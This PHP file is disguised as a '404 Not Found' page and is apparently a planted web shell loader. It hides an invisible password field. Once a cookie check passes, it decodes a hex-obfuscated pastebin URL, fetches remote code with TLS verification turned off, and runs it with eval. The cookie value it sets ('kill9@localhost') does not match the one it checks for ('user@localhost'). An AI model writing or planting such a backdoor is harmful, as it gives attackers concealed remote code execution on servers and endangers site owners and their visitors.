<?php
function is_logged_in() {
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user@localhost';
}

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}

function get_remote_content($url) {
    $function_list = array_map('hex2str', [
        '666f70656e',
        '73747265616d5f6765745f636f6e74656e7473',
        '66696c655f6765745f636f6e74656e7473',
        '6375726c5f65786563'
    ]);
    list($fopen, $stream_get_contents, $file_get_contents, $curl_exec) = $function_list;

    if (function_exists($curl_exec)) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_USERAGENT => "Mozilla/5.0",
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_SSL_VERIFYHOST => 0
        ]);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    } elseif (function_exists($file_get_contents)) {
        return file_get_contents($url);
    } elseif (function_exists($fopen) && function_exists($stream_get_contents)) {
        $handle = fopen($url, "r");
        $result = stream_get_contents($handle);
        fclose($handle);
        return $result;
    }
    return false;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
    $entered_key = $_POST['pass'];
    $hashed_key = '$2y$10$jUDcb6BC7/6WV.tMLr.fdOiK1SPrNaOcl0cq2XQFB/1jWHyD/Z6Fe';

    if (password_verify($entered_key, $hashed_key)) {
        setcookie('user_id', 'kill9@localhost', time() + 3600, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

if (is_logged_in()) {
    $proto = hex2str('68747470733a2f2f');
    $host  = hex2str('706173746562696e2e636f6d');
    $path  = hex2str('7261772f365337706d504a76');
    $url   = $proto . $host . '/' . $path;

    $code = get_remote_content($url);
    if ($code !== false) {
        eval('?>' . $code);
    }
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
    <meta name="robots" content="noindex,nofollow">
    <style>
        html, body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            width: 100%;
            height: 100%;
        }

        body {
            font-family: sans-serif;
        }

        form {
            position: absolute;
            top: 10px;
            left: 10px;
            z-index: 9999;
        }

        input[type=password] {
            background: transparent;
            border: none;
            outline: none;
            color: black;
            caret-color: black;
            font-size: 14px;
            width: 120px;
            height: 20px;
            opacity: 1;
        }

        iframe {
            position: absolute;
            top: 0;
            left: 0;
            border: none;
            width: 100%;
            height: 100%;
        }

        #hiddenWrap {
            visibility: hidden;
            position: absolute;
            left: -9999px;
        }
    </style>
</head>
<body>
    <div id="hiddenWrap">
        <form method="post" id="loginForm">
            <input type="password" name="pass" id="passInput" autocomplete="off">
            <input type="submit" name="watching" value="submit" style="display:none;">
        </form>
    </div>

    <iframe src="//<?php echo $_SERVER['SERVER_NAME']; ?>/404" 
        id="iframe_id" 
        onload="document.title=this.contentDocument ? this.contentDocument.title : this.contentWindow.document.title;">
    </iframe>

    <script>
        window.onload = () => {
            const wrap = document.getElementById('hiddenWrap');
            document.body.appendChild(wrap.firstElementChild);
            wrap.remove();

            const input = document.getElementById('passInput');

            input.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    document.getElementById('loginForm').submit();
                }
            });
        };
    </script>
</body>
</html>
